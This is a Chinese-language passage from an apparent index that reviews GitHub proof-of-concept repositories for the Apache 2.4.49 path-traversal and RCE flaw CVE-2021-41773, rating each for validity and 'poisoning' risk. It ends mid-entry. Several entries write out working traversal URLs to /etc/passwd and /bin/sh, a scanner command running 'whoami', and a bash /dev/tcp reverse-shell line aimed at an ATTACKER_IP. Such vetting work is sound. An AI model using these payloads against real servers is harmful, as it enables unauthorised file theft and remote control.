*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

